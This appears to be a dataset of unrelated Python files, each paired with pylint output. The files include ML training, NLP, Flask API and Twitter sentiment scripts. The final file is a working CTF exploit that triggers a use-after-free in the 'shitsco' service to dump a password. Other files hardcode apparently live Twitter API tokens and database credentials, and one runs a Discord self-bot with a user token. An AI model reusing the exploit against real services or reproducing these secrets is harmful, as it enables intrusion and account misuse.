25   logging.basicConfig(format='%(asctime)s: %(levelname)s: %(message)s',datefmt='%a, %d %b %Y %H:%M:%S',filename=log_filename+'/qa.log',filemode='w')
26   logging.root.setLevel(level=logging.INFO)
27   logger.info(""running %s"" % ' '.join(sys.argv))
28       
29   
30   
31   from data_helper import log_time_delta,getLogger
32   
33   logger=getLogger()
34       
35   
36   
37   
38   args = Singleton().get_qcnn_flag()
39   
40   args._parse_flags()
41   opts=dict()
42   logger.info(""\nParameters:"")
43   for attr, value in sorted(args.__flags.items()):
44       logger.info((""{}={}"".format(attr.upper(), value)))
45       opts[attr]=value
46   
47   
48   train,test,dev = data_helper.load(args.data,filter = args.clean)
49   
50   q_max_sent_length = max(map(lambda x:len(x),train['question'].str.split()))
51   a_max_sent_length = max(map(lambda x:len(x),train['answer'].str.split()))
52   
53   alphabet = data_helper.get_alphabet([train,test,dev],dataset=args.data )
54   logger.info('the number of words :%d '%len(alphabet))
55   
56   if args.data==""quora"" or  args.data==""8008"" :
57       print(""cn embedding"")
58       embedding = data_helper.get_embedding(alphabet,dim=200,language=""cn"",dataset=args.data )
59       train_data_loader = data_helper.getBatch48008
60   else:
61       embedding = data_helper.get_embedding(alphabet,dim=300,dataset=args.data )
62       train_data_loader = data_helper.get_mini_batch
63   opts[""embeddings""] =embedding
64   opts[""vocab_size""]=len(alphabet)
65   opts[""max_input_right""]=a_max_sent_length
66   opts[""max_input_left""]=q_max_sent_length
67   opts[""filter_sizes""]=list(map(int, args.filter_sizes.split("","")))
68   
69   print(""innitilize over"")
70   
71   
72      
73    
74   #with tf.Graph().as_default(), tf.device(""/gpu:"" + str(args.gpu)):
75   with tf.Graph().as_default():    
76       # with tf.device(""/cpu:0""):
77       session_conf = tf.ConfigProto()
78       session_conf.allow_soft_placement = args.allow_soft_placement
79       session_conf.log_device_placement = args.log_device_placement
80       session_conf.gpu_options.allow_growth = True
81       sess = tf.Session(config=session_conf)
82       model=models.setup(opts)
83       model.build_graph()    
84       saver = tf.train.Saver()
85       
86   #    ckpt = tf.train.get_checkpoint_state(""checkpoint"")    
87   #    if ckpt and ckpt.model_checkpoint_path:    
88   #        # Restores from checkpoint    
89   #        saver.restore(sess, ckpt.model_checkpoint_path)
90   #    if os.path.exists(""model"") :                        
91   #        import shutil
92   #        shutil.rmtree(""model"")        
93   #    builder = tf.saved_model.builder.SavedModelBuilder(""./model"")
94   #    builder.add_meta_graph_and_variables(sess, [tf.saved_model.tag_constants.SERVING])
95   #    builder.save(True)
96   #    variable_averages = tf.train.ExponentialMovingAverage(  model)    
97   #    variables_to_restore = variable_averages.variables_to_restore()    
98   #    saver = tf.train.Saver(variables_to_restore)  
99   #    for name in variables_to_restore:    
100   #        print(name) 
101   
102       sess.run(tf.global_variables_initializer())
103       @log_time_delta
104       def predict(model,sess,batch,test):
105           scores = []
106           for data in batch:            
107               score = model.predict(sess,data)
108               scores.extend(score)  
109           return np.array(scores[:len(test)])
110       
111       best_p1=0
112       
113       
114   
115       
116       for i in range(args.num_epoches):  
117           
118           for data in train_data_loader(train,alphabet,args.batch_size,model=model,sess=sess):
119   #        for data in data_helper.getBatch48008(train,alphabet,args.batch_size):
120               _, summary, step, loss, accuracy,score12, score13, see = model.train(sess,data)
121               time_str = datetime.datetime.now().isoformat()
122               print(""{}: step {}, loss {:g}, acc {:g} ,positive {:g},negative {:g}"".format(time_str, step, loss, accuracy,np.mean(score12),np.mean(score13)))
123               logger.info(""{}: step {}, loss {:g}, acc {:g} ,positive {:g},negative {:g}"".format(time_str, step, loss, accuracy,np.mean(score12),np.mean(score13)))
124   #<<<<<<< HEAD
125   #        
126   # 
127   #        if i>0 and i % 5 ==0:
128   #            test_datas = data_helper.get_mini_batch_test(test,alphabet,args.batch_size)
129   #        
130   #            predicted_test = predict(model,sess,test_datas,test)
131   #            map_mrr_test = evaluation.evaluationBypandas(test,predicted_test)
132   #        
133   #            logger.info('map_mrr test' +str(map_mrr_test))
134   #            print('map_mrr test' +str(map_mrr_test))
135   #            
136   #            test_datas = data_helper.get_mini_batch_test(dev,alphabet,args.batch_size)
137   #            predicted_test = predict(model,sess,test_datas,dev)
138   #            map_mrr_test = evaluation.evaluationBypandas(dev,predicted_test)
139   #        
140   #            logger.info('map_mrr dev' +str(map_mrr_test))
141   #            print('map_mrr dev' +str(map_mrr_test))
142   #            map,mrr,p1 = map_mrr_test
143   #            if p1>best_p1:
144   #                best_p1=p1
145   #                filename= ""checkpoint/""+args.data+""_""+str(p1)+"".model""
146   #                save_path = saver.save(sess, filename)  
147   #        #            load_path = saver.restore(sess, model_path)
148   #                
149   #                import shutil
150   #                shutil.rmtree(""model"")
151   #                builder = tf.saved_model.builder.SavedModelBuilder(""./model"")
152   #                builder.add_meta_graph_and_variables(sess, [tf.saved_model.tag_constants.SERVING])
153   #                builder.save(True)
154   #        
155   #        
156   #=======
157   
158           test_datas = data_helper.get_mini_batch_test(test,alphabet,args.batch_size)
159   
160           predicted_test = predict(model,sess,test_datas,test)
161           map_mrr_test = evaluation.evaluationBypandas(test,predicted_test)
162   
163           logger.info('map_mrr test' +str(map_mrr_test))
164           print('epoch '+ str(i) + 'map_mrr test' +str(map_mrr_test))
165   
","27 - warning: logging-not-lazy
40 - warning: protected-access
41 - refactor: use-dict-literal
43 - warning: protected-access
50 - warning: unnecessary-lambda
51 - warning: unnecessary-lambda
56 - refactor: consider-using-in
104 - warning: redefined-outer-name
104 - warning: redefined-outer-name
104 - warning: redefined-outer-name
106 - warning: redefined-outer-name
1 - warning: unused-import
"
"1   # For this solution I'm using TextBlob, using it's integration with WordNet.
2   
3   from textblob import TextBlob
4   from textblob import Word
5   from textblob.wordnet import VERB
6   import nltk
7   import os
8   import sys
9   import re
10   import json
11   
12   results = { ""results"" : [] }
13   
14   #Override NLTK data path to use the one I uploaded in the folder
15   dir_path = os.path.dirname(os.path.realpath(__file__))
16   nltk_path = dir_path + os.path.sep + ""nltk_data""
17   nltk.data.path= [nltk_path]
18   
19   #Text to analyze
20   TEXT = """"""
21           Take this paragraph of text and return an alphabetized list of ALL unique words.  A unique word is any form of a word often communicated
22           with essentially the same meaning. For example,
23           fish and fishes could be defined as a unique word by using their stem fish. For each unique word found in this entire paragraph,
24           determine the how many times the word appears in total.
25           Also, provide an analysis of what sentence index position or positions the word is found.
26           The following words should not be included in your analysis or result set: ""a"", ""the"", ""and"", ""of"", ""in"", ""be"", ""also"" and ""as"".
27           Your final result MUST be displayed in a readable console output in the same format as the JSON sample object shown below. 
28           """"""
29   TEXT = TEXT.lower()
30   
31   WORDS_NOT_TO_CONSIDER = [""a"", ""the"", ""and"", ""of"", ""in"", ""be"", ""also"", ""as""]
32   nlpText= TextBlob(TEXT)
33   
34   def getSentenceIndexesForWord(word, sentences):
35       sentenceIndexes = []
36       for index, sentence in enumerate(sentences):
37           count = sum(1 for _ in re.finditer(r'\b%s\b' % re.escape(word.lower()), sentence))
38           if count > 0:
39               sentenceIndexes.append(index)
40       return sentenceIndexes
41   
42   #1: Get all words, excluding repetitions and all the sentences in the text
43   nlpTextWords = sorted(set(nlpText.words))
44   nlpTextSentences = nlpText.raw_sentences
45   
46   #2 Get results
47   synonymsList = []
48   allreadyReadWords = []
49   for word in nlpTextWords:
50       if word not in WORDS_NOT_TO_CONSIDER and word not in allreadyReadWords:
51           timesInText = nlpText.word_counts[word]
52           
53           #Get sentence indexes where the word can be found
54           sentenceIndexes = getSentenceIndexesForWord(word, nlpTextSentences)
55   
56           #Check for synonyms
57           for word2 in nlpTextWords:
58               if word2 not in WORDS_NOT_TO_CONSIDER and ( word.lower() != word2.lower() and len(list(set(word.synsets) & set(word2.synsets))) > 0 ):
59                   #If I find a synonym of the word I add it to the list of words allready read and add the times that synonym appeared in the text to the total
60                   #count of the unique word and the corresponding sentence indexes
61                   allreadyReadWords.append(word2)
62                   timesInText = timesInText + nlpText.word_counts[word2]
63                   sentenceIndexes += getSentenceIndexesForWord(word2,nlpTextSentences)
64                   
65           allreadyReadWords.append(word)
66           
67           results[""results""].append({""word"" : word.lemmatize(), #I return the lemma of the word because TextBlob's stems seem to be wrong for certain words
68                                      ""total-occurances"": timesInText,
69                                      ""sentence-indexes"": sorted(set(sentenceIndexes))})
70   
71   print(json.dumps(results, indent=4))
72               
73               
74           
","34 - warning: redefined-outer-name
35 - warning: redefined-outer-name
4 - warning: unused-import
5 - warning: unused-import
8 - warning: unused-import
"
"1   import requests
2   import time
3   
4   token = ""TOKEN""
5   
6   headers = {
7       'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
8       'Authorization' : token
9   }
10   
11   id = input(f""[?] Salon ID: "")
12   print("""")
13   
14   while True:
15       requests.post(
16           f""https://discord.com/api/channels/{id}/messages"",
17           headers = headers,
18           json = {""content"" : ""!d bump""}
19       )
20       print(""[+] Serveur Bumpé"")
21       time.sleep(121 * 60)","11 - warning: redefined-builtin
11 - warning: f-string-without-interpolation
15 - warning: missing-timeout
"
"1   # Madis Settings
2   MADIS_PATH='/Users/alexiatopalidou/Desktop/erg/madis/src'
3   
4   # Webserver Settings
5   # IMPORTANT: The port must be available.
6   web_port = 9090  # must be integer (this is wrong:'9090')
","Clean Code: No Issues Detected
"
"1   # -*- coding: utf-8 -*-
2   import os
3   import Queue
4   import random
5   from functools import wraps
6   
7   import arrow
8   from flask import g, request
9   from flask_restful import reqparse, Resource
10   from passlib.hash import sha256_crypt
11   from itsdangerous import TimedJSONWebSignatureSerializer as Serializer
12   
13   from car_recg import app, db, api, auth, limiter, logger, access_logger
14   from models import Users, Scope
15   import helper
16   
17   
18   def verify_addr(f):
19       """"""IP地址白名单""""""
20       @wraps(f)
21       def decorated_function(*args, **kwargs):
22           if not app.config['WHITE_LIST_OPEN'] or request.remote_addr == '127.0.0.1' or request.remote_addr in app.config['WHITE_LIST']:
23               pass
24           else:
25               return {'status': '403.6',
26                       'message': u'禁止访问:客户端的 IP 地址被拒绝'}, 403
27           return f(*args, **kwargs)
28       return decorated_function
29   
30   
31   @auth.verify_password
32   def verify_password(username, password):
33       if username.lower() == 'admin':
34           user = Users.query.filter_by(username='admin').first()
35       else:
36           return False
37       if user:
38           return sha256_crypt.verify(password, user.password)
39       return False
40   
41   
42   def verify_token(f):
43       """"""token验证装饰器""""""
44       @wraps(f)
45       def decorated_function(*args, **kwargs):
46           if not request.headers.get('Access-Token'):
47               return {'status': '401.6', 'message': 'missing token header'}, 401
48           token_result = verify_auth_token(request.headers['Access-Token'],
49                                            app.config['SECRET_KEY'])
50           if not token_result:
51               return {'status': '401.7', 'message': 'invalid token'}, 401
52           elif token_result == 'expired':
53               return {'status': '401.8', 'message': 'token expired'}, 401
54           g.uid = token_result['uid']
55           g.scope = set(token_result['scope'])
56   
57           return f(*args, **kwargs)
58       return decorated_function
59   
60   
61   def verify_scope(scope):
62       def scope(f):
63           """"""权限范围验证装饰器""""""
64           @wraps(f)
65           def decorated_function(*args, **kwargs):
66               if 'all' in g.scope or scope in g.scope:
67                   return f(*args, **kwargs)
68               else:
69                   return {}, 405
70           return decorated_function
71       return scope
72   
73   
74   class Index(Resource):
75   
76       def get(self):
77           return {
78               'user_url': '%suser{/user_id}' % (request.url_root),
79               'scope_url': '%suser/scope' % (request.url_root),
80               'token_url': '%stoken' % (request.url_root),
81               'recg_url': '%sv1/recg' % (request.url_root),
82               'uploadrecg_url': '%sv1/uploadrecg' % (request.url_root),
83               'state_url': '%sv1/state' % (request.url_root)
84           }, 200, {'Cache-Control': 'public, max-age=60, s-maxage=60'}
85   
86   
87   class RecgListApiV1(Resource):
88   
89       def post(self):
90           parser = reqparse.RequestParser()
91   
92           parser.add_argument('imgurl', type=unicode, required=True,
93                               help='A jpg url is require', location='json')
94           parser.add_argument('coord', type=list, required=True,
95                               help='A coordinates array is require',
96                               location='json')
97           args = parser.parse_args()
98   
99           # 回调用的消息队列
100           que = Queue.Queue()
101   
102           if app.config['RECGQUE'].qsize() > app.config['MAXSIZE']:
103               return {'message': 'Server Is Busy'}, 449
104   
105           imgname = '%32x' % random.getrandbits(128)
106           imgpath = os.path.join(app.config['IMG_PATH'], '%s.jpg' % imgname)
107           try:
108               helper.get_url_img(request.json['imgurl'], imgpath)
109           except Exception as e:
110               logger.error('Error url: %s' % request.json['imgurl'])
111               return {'message': 'URL Error'}, 400
112   
113           app.config['RECGQUE'].put((10, request.json, que, imgpath))
114   
115           try:
116               recginfo = que.get(timeout=15)
117   
118               os.remove(imgpath)
119           except Queue.Empty:
120               return {'message': 'Timeout'}, 408
121           except Exception as e:
122               logger.error(e)
123           else:
124               return {
125                   'imgurl': request.json['imgurl'],
126                   'coord': request.json['coord'],
127                   'recginfo': recginfo
128               }, 201
129   
130   
131   class StateListApiV1(Resource):
132   
133       def get(self):
134           return {
135               'threads': app.config['THREADS'],
136               'qsize': app.config['RECGQUE'].qsize()
137           }
138   
139   
140   class UploadRecgListApiV1(Resource):
141   
142       def post(self):
143           # 文件夹路径 string
144           filepath = os.path.join(app.config['UPLOAD_PATH'],
145                                   arrow.now().format('YYYYMMDD'))
146           if not os.path.exists(filepath):
147               os.makedirs(filepath)
148           try:
149               # 上传文件命名 随机32位16进制字符 string
150               imgname = '%32x' % random.getrandbits(128)
151               # 文件绝对路径 string
152               imgpath = os.path.join(filepath, '%s.jpg' % imgname)
153               f = request.files['file']
154               f.save(imgpath)
155           except Exception as e:
156               logger.error(e)
157               return {'message': 'File error'}, 400
158   
159           # 回调用的消息队列 object
160           que = Queue.Queue()
161           # 识别参数字典 dict
162           r = {'coord': []}
163           app.config['RECGQUE'].put((9, r, que, imgpath))
164           try:
165               recginfo = que.get(timeout=app.config['TIMEOUT'])
166           except Queue.Empty:
167               return {'message': 'Timeout'}, 408
168           except Exception as e:
169               logger.error(e)
170           else:
171               return {'coord': r['coord'], 'recginfo': recginfo}, 201
172   
173   api.add_resource(Index, '/')
174   api.add_resource(RecgListApiV1, '/v1/recg')
175   api.add_resource(StateListApiV1, '/v1/state')
176   api.add_resource(UploadRecgListApiV1, '/v1/uploadrecg')
","26 - warning: redundant-u-string-prefix
48 - error: undefined-variable
50 - refactor: no-else-return
62 - error: function-redefined
66 - refactor: no-else-return
74 - refactor: too-few-public-methods
92 - error: undefined-variable
109 - warning: broad-exception-caught
121 - warning: broad-exception-caught
89 - refactor: inconsistent-return-statements
97 - warning: unused-variable
109 - warning: unused-variable
87 - refactor: too-few-public-methods
131 - refactor: too-few-public-methods
155 - warning: broad-exception-caught
168 - warning: broad-exception-caught
142 - refactor: inconsistent-return-statements
140 - refactor: too-few-public-methods
11 - warning: unused-import
13 - warning: unused-import
13 - warning: unused-import
13 - warning: unused-import
14 - warning: unused-import
"
"1   # -*- coding: utf-8 -*-
2   import Queue
3   
4   
5   class Config(object):
6       # 密码 string
7       SECRET_KEY = 'hellokitty'
8       # 服务器名称 string
9       HEADER_SERVER = 'SX-CarRecgServer'
10       # 加密次数 int
11       ROUNDS = 123456
12       # token生存周期，默认1小时 int
13       EXPIRES = 7200
14       # 数据库连接 string
15       SQLALCHEMY_DATABASE_URI = 'mysql://root:root@127.0.0.1/hbc_store'
16       # 数据库连接绑定 dict
17       SQLALCHEMY_BINDS = {}
18       # 用户权限范围 dict
19       SCOPE_USER = {}
20       # 白名单启用 bool
21       WHITE_LIST_OPEN = True
22       # 白名单列表 set
23       WHITE_LIST = set()
24       # 处理线程数 int
25       THREADS = 4
26       # 允许最大数队列为线程数16倍 int
27       MAXSIZE = THREADS * 16
28       # 图片下载文件夹 string
29       IMG_PATH = 'img'
30       # 图片截取文件夹 string
31       CROP_PATH = 'crop'
32       # 超时 int
33       TIMEOUT = 5
34       # 识别优先队列 object
35       RECGQUE = Queue.PriorityQueue()
36       # 退出标记 bool
37       IS_QUIT = False
38       # 用户字典 dict
39       USER = {}
40       # 上传文件保存路径 string
41       UPLOAD_PATH = 'upload'
42   
43   
44   class Develop(Config):
45       DEBUG = True
46   
47   
48   class Production(Config):
49       DEBUG = False
50   
51   
52   class Testing(Config):
53       TESTING = True
","5 - refactor: useless-object-inheritance
5 - refactor: too-few-public-methods
44 - refactor: too-few-public-methods
48 - refactor: too-few-public-methods
52 - refactor: too-few-public-methods
"
"1   from car_recg import app
2   from car_recg.recg_ser import RecgServer
3   from ini_conf import MyIni
4   
5   if __name__ == '__main__':
6       rs = RecgServer()
7       rs.main()
8       my_ini = MyIni()
9       sys_ini = my_ini.get_sys_conf()
10       app.config['THREADS'] = sys_ini['threads']
11       app.config['MAXSIZE'] = sys_ini['threads'] * 16
12       app.run(host='0.0.0.0', port=sys_ini['port'], threaded=True)
13       del rs
14       del my_ini
","Clean Code: No Issues Detected
"
"1   '''
2   Input- zoho123
3   Output- ohoz123
4   
5   '''
6   char= input(""Enter the string: "")
7   char2= list(char)
8   num= ""1234567890""
9   list1= [0]*len(char)
10   list2=[]
11   for i in range(len(char)):
12       if char2[i] not in num:
13           list2.append( char2.index( char2[i]))
14           char2[i]= ""*""
15   list2.reverse()
16   k=0
17   for j in range( len(char) ):
18       if j in list2:
19           list1[j]= char[list2[k]]
20           k= k+1
21       else:
22           list1[j]= char[j]
23   ch=""""
24   for l in range(len(list1)):
25       ch= ch+ list1[l]
26   print(ch)
","Clean Code: No Issues Detected
"
"1   import os
2   import sys
3   import argparse
4   from PIL import Image # From Pillow (pip install Pillow)
5   
6   def resize_photos(dir, new_x, new_y, scale):
7       if(not os.path.exists(dir)):
8           # if not in full path format (/usrers/user/....)
9           # check if path is in local format (folder is in current working directory)
10           if(not os.path.exists(os.path.join(os.getcwd(), dir))):
11               print(dir + "" does not exist."")
12               exit()
13           else:
14               # path is not a full path, but folder exists in current working directory
15               # convert path to full path
16               dir = os.path.join(os.getcwd(), dir)
17               
18       i = 1 # image counter for print statements
19       for f in os.listdir(dir):
20           if(not f.startswith('.') and '.' in f):
21               # accepted image types. add more types if you need to support them!
22               accepted_types = [""jpg"", ""png"", ""bmp""]
23               if(f[-3:].lower() in accepted_types):
24                   # checks last 3 letters of file name to check file type (png, jpg, bmp...)
25                   # TODO: need to handle filetypes of more than 3 letters (for example, jpeg)
26                   path = os.path.join(dir, f)
27                   img = Image.open(path)
28   
29                   if(scale > 0):
30                       w, h = img.size
31                       newIm = img.resize((w*scale, h*scale))
32                   else:
33                       newIm = img.resize((new_x, new_y))
34   
35                   newIm.save(path)
36                   print(""Image #"" + str(i) + "" finsihed resizing: "" + path)
37                   i=i+1
38               else:
39                   print(f + "" of type: "" + f[-3:].lower() + "" is not an accepted file type. Skipping."")
40       print(""ALL DONE :) Resized: "" + str(i) + "" photos"")
41   
42   if __name__ == ""__main__"":
43       parser = argparse.ArgumentParser()
44       parser.add_argument(""-d"", ""-directory"", help=""(String) Specify the folder path of images to resize"")
45       parser.add_argument(""-s"", ""-size"", help=""(Integer) New pixel value of both width and height. To specify width and height seperately, use -x and -y."")
46       parser.add_argument(""-x"", ""-width"", help=""(Integer) New pixel value of width"")
47       parser.add_argument(""-y"", ""-height"", help=""(Integer) New pixel value of height"")
48       parser.add_argument(""-t"", ""-scale"", help=""(Integer) Scales pixel sizes."")
49   
50       args = parser.parse_args()
51   
52       if(not args.d or ((not args.s) and (not args.x and not args.y) and (not args.t))):
53           print(""You have error(s)...\n"")
54           if(not args.d):
55               print(""+ DIRECTORY value missing Please provide a path to the folder of images using the argument '-d'\n"")
56           if((not args.s) and (not args.x or not args.y) and (not args.t)):
57               print(""+ SIZE value(s) missing! Please provide a new pixel size. Do this by specifying -s (width and height) OR -x (width) and -y (height) values OR -t (scale) value"")
58           exit()
59   
60       x = 0
61       y = 0
62       scale = 0
63       if(args.s):
64           x = int(args.s)
65           y = int(args.s)
66       elif(args.x and args.y):
67           x = int(args.x)
68           y = int(args.y)
69       elif(args.t):
70           scale = int(args.t)
71   
72       print(""Resizing all photos in: "" + args.d + "" to size: "" + str(x)+""px,""+str(y)+""px"")
73       resize_photos(args.d, x, y, scale)
","25 - warning: fixme
6 - warning: redefined-builtin
6 - warning: redefined-outer-name
12 - refactor: consider-using-sys-exit
58 - refactor: consider-using-sys-exit
2 - warning: unused-import
"
"1   import tweepy
2   import csv
3   import pandas as pd
4   from textblob import TextBlob
5   import matplotlib.pyplot as plt
6   
7   ####input your credentials here
8   consumer_key = 'FgCG8zcxF4oINeuAqUYzOw9xh'
9   consumer_secret = 'SrSu7WhrYUpMZnHw7a5ui92rUA1n2jXNoZVb3nJ5wEsXC5xlN9'
10   access_token = '975924102190874624-uk5zGlYRwItkj7pZO2m89NefRm5DFLg'
11   access_token_secret = 'ChvmTjG8hl61xUrXkk3AdKcXMlvAKf4ise1kIQLKsnPu4'
12   
13   auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
14   auth.set_access_token(access_token, access_token_secret)
15   api = tweepy.API(auth,wait_on_rate_limit=True)
16   
17   # Open/Create a file to append data
18   csvFile = open('tweets.csv', 'w+')
19   # Use csv Writer
20   csvWriter = csv.writer(csvFile)
21   tag = ""#DonaldTrump""
22   limit = 0
23   res = """"
24   positive = 0
25   negative = 0
26   neutral = 0
27   csvWriter.writerow([""ID"", ""Username"", ""Twitter @"", ""Tweet"",""Tweeted At"", ""Favourite Count"", ""Retweet Count"", ""Sentiment""])
28   csvWriter.writerow([])
29   
30   for tweet in tweepy.Cursor(api.search,q=""""+tag,count=350,lang=""en"",tweet_mode = ""extended"").items():
31       # print (tweet.created_at, tweet.text)
32       temp = tweet.full_text
33       if temp.startswith('RT @'):
34       	continue
35       blob = TextBlob(tweet.full_text)
36       if blob.sentiment.polarity > 0:
37           res = ""Positive""
38           positive = positive+1
39       elif blob.sentiment.polarity == 0:
40           res = ""Neutral""
41           neutral = neutral+1
42       else:
43           res = ""Negative""
44           negative = negative+1
45   
46   
47       print (""ID:"", tweet.id)
48       print (""User ID:"", tweet.user.id)
49       print (""Name: "", tweet.user.name)
50       print (""Twitter @:"", tweet.user.screen_name)
51       print (""Text:"", tweet.full_text)
52       print (""Tweet length:"", len(tweet.full_text))
53       print (""Created:(UTC)"", tweet.created_at)
54       print (""Favorite Count:"", tweet.favorite_count)
55       print (""Retweet count:"", tweet.retweet_count)
56       print (""Sentiment:"", res)
57       # print (""Retweeted? :"", tweet.retweeted)
58       # print (""Truncated:"", tweet.truncated)
59       print (""\n\n"")
60       
61       csvWriter.writerow([tweet.id, tweet.user.name, tweet.user.screen_name, tweet.full_text,tweet.created_at, tweet.favorite_count, tweet.retweet_count, res])
62       csvWriter.writerow([])
63       limit = limit + 1
64       if limit == 25:
65       	break
66   
67   print (""Done"")
68   
69   print (""\n\n\n"")
70   total = positive+negative+neutral
71   positivePercent = 100*(positive/total)
72   negativePercent = 100*(negative/total)
73   neutralPercent = 100*(neutral/total)
74   
75   print (""Positive tweets: {} %"".format(positivePercent))
76   print (""Negative tweets: {} %"".format(negativePercent))
77   print (""Neutral tweets: {} %"".format(neutralPercent))
78   
79   
80   
81   # infile = 'tweets.csv'
82   
83   # with open(infile, 'r') as csvfile:
84   #     rows = csv.reader(csvfile)
85   #     for row in rows:
86   #         sentence = row[3]
87   #         blob = TextBlob(sentence)
88   #         print (blob.sentiment)
89   
90   
91   labels = 'Neutral', 'Positive', 'Negative'
92   sizes = []
93   sizes.append(neutralPercent)
94   sizes.append(positivePercent)
95   sizes.append(negativePercent)
96   colors = ['lightskyblue','yellowgreen', 'lightcoral']
97   explode = (0.0, 0, 0)  # explode 1st slice
98    
99   # Plot
100   plt.pie(sizes, explode=explode, labels=labels, colors=colors,
101           autopct='%1.1f%%', shadow=False, startangle=140)
102   plt.suptitle(""Sentiment Analysis of {} tweets related to {}"".format(limit, tag))
103   plt.axis('equal')
104   plt.show()
105   
","34 - warning: bad-indentation
65 - warning: bad-indentation
18 - warning: unspecified-encoding
18 - refactor: consider-using-with
3 - warning: unused-import
"
"1   from flask import Flask, render_template, request
2   from test import mining
3   app = Flask(__name__)
4   
5   @app.route('/')
6   def index():
7   	return render_template('hello.html')
8   
9   
10   @app.route('/', methods=['GET', 'POST'])
11   def submit():
12   	if request.method == 'POST':
13   		print (request.form) # debug line, see data printed below
14   		tag = request.form['tag']
15   		limit = request.form['limit']
16   		# msg = tag+"" ""+limit
17   		sen_list = mining(tag,limit)
18   		msg = ""Positive Percent = ""+sen_list[0]+""% <br>Negative Percent = ""+sen_list[1]+""% <br>Neutral Percent = ""+sen_list[2]+""%""
19   	return """"+msg
20   
21   if __name__ == '__main__':
22      app.run(debug = True)
23   
24   print(""This"")","7 - warning: bad-indentation
12 - warning: bad-indentation
13 - warning: bad-indentation
14 - warning: bad-indentation
15 - warning: bad-indentation
17 - warning: bad-indentation
18 - warning: bad-indentation
19 - warning: bad-indentation
22 - warning: bad-indentation
2 - error: no-name-in-module
19 - error: possibly-used-before-assignment
"
"1   import csv
2   csvFile = open('res.csv', 'w+')","2 - warning: unspecified-encoding
2 - refactor: consider-using-with
1 - warning: unused-import
"
"1   #!/usr/bin/env python
2   
3   print (""some output"")
4   return ""hello""","4 - error: return-outside-function
"
"1   import matplotlib.pyplot as plt
2    
3   # Data to plot
4   labels = 'Neutral', 'Positive', 'Negative'
5   sizes = [20, 40, 40]
6   colors = ['lightskyblue','yellowgreen', 'lightcoral']
7   explode = (0.0, 0, 0)  # explode 1st slice
8    
9   # Plot
10   plt.pie(sizes, explode=explode, labels=labels, colors=colors,
11           autopct='%1.1f%%', shadow=True, startangle=140)
12    
13   plt.axis('equal')
14   # plt.title('Sentiment analysis')
15   plt.suptitle('Analysing n tweets related to #')
16   plt.show()","Clean Code: No Issues Detected
"
"1   import tweepy
2   import csv
3   import pandas as pd
4   
5   
6   # keys and tokens from the Twitter Dev Console
7   consumer_key = 'FgCG8zcxF4oINeuAqUYzOw9xh'
8   consumer_secret = 'SrSu7WhrYUpMZnHw7a5ui92rUA1n2jXNoZVb3nJ5wEsXC5xlN9'
9   access_token = '975924102190874624-uk5zGlYRwItkj7pZO2m89NefRm5DFLg'
10   access_token_secret = 'ChvmTjG8hl61xUrXkk3AdKcXMlvAKf4ise1kIQLKsnPu4'
11   
12   #Twitter only allows access to a users most recent 3240 tweets with this method
13   
14   #authorize twitter, initialize tweepy
15   auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
16   auth.set_access_token(access_token, access_token_secret)
17   api = tweepy.API(auth)
18   
19   #initialize a list to hold all the tweepy Tweets
20   alltweets = []    
21   
22   #make initial request for most recent tweets (200 is the maximum allowed count)
23   new_tweets = api.search(q=""#DonaldTrump"",count=200,tweet_mode=""extended"")
24   
25   #save most recent tweets
26   alltweets.extend(new_tweets)
27   
28   #save the id of the oldest tweet less one
29   # oldest = alltweets[-1].id - 1
30   #keep grabbing tweets until there are no tweets left to grab
31   while len(new_tweets) > 0:
32       # print ""getting tweets before %s"" % (oldest)
33   
34       #all subsiquent requests use the max_id param to prevent duplicates
35       new_tweets = api.search(q=""#DonaldTrump"",count=200,tweet_mode=""extended"")
36   
37       #save most recent tweets
38       alltweets.extend(new_tweets)
39   
40       #update the id of the oldest tweet less one
41       oldest = alltweets[-1].id - 1
42   
43       # print ""...%s tweets downloaded so far"" % (len(alltweets))
44   
45   #transform the tweepy tweets into a 2D array that will populate the csv    
46   outtweets = [[tweet.id_str, tweet.created_at, tweet.full_tweet.encode(""utf-8""), tweet.retweet_count, tweet.favorite_count] for tweet in alltweets]
47   
48   #write the csv    
49   with open('tweets.csv', 'w+') as f:
50   	writer = csv.writer(f)
51   	writer.writerow([""id"",""created_at"",""full_text"",""retweet_count"",""favorite_count""])
52   	writer.writerows(outtweets)
53   
","50 - warning: bad-indentation
51 - warning: bad-indentation
52 - warning: bad-indentation
49 - warning: unspecified-encoding
3 - warning: unused-import
"
"1   from test import mining
2   tag = ""#WednesdayWisdom""
3   limit = ""10""
4   sen_list = mining(tag,int(limit))
5   print(sen_list)","1 - error: no-name-in-module
"
"1   #!/usr/bin/env python
2   
3   import socket
4   from struct import pack, unpack
5   
6   DEBUG = False
7   
8   server = ""shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me""
9   server = ""127.0.0.1""
10   port = 31337
11   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
12   s.connect((server, port))
13   s.settimeout(30)
14   
15   def recv_until(s, pattern):
16   	ret = ''
17   	while True:
18   		c = s.recv(1)
19   		if c == '':
20   			raise Exception(""Connection closed"")
21   		ret += c
22   		if ret.find(pattern) != -1:
23   			break
24   	return ret
25   
26   # trigger use-after-free by creating 2 items and then removing them in order
27   print recv_until(s, ""$ "")
28   print ""set 1 abcd""
29   s.send(""set 1 abcd\n"")
30   print recv_until(s, ""$ "")
31   print ""set 2 abcd""
32   s.send(""set 2 abcd\n"")
33   print recv_until(s, ""$ "")
34   print ""set 1""
35   s.send(""set 1\n"")
36   print recv_until(s, ""$ "")
37   print ""set 2""
38   s.send(""set 2\n"")
39   print recv_until(s, ""$ "")
40   
41   
42   print ""show <pointers>""
43   # set use-after-free item via strdup of argument to 'show' command
44   #  first two items are the key,value pair followed by blink and flink
45   #  use a pointer to the string ""password"" in the code section for the key (0x80495d0)
46   #  use the location of the password in bss for the value (0x804c3a0)
47   #  use something to terminate the linked list for flink and blink
48   #   - can't use null directly here since the strdup allocation would be cut short (must be 16 bytes to re-use the free'd block)
49   #   - just use a pointer to some nulls in bss instead (0x804c390)
50   s.send(""show "" + pack(""<IIII"", 0x80495d0, 0x804C3A0, 0x804C390, 0x0804C390) + ""\n"")
51   print recv_until(s, ""$ "")
52   
53   # now, this will simply dump the password for us
54   print ""show""
55   s.send(""show\n"")
56   a = recv_until(s, ': ')
57   pw = recv_until(s, '\n')[:-1]
58   b = recv_until(s, ""$ "")
59   print a + pw + '\n' + b
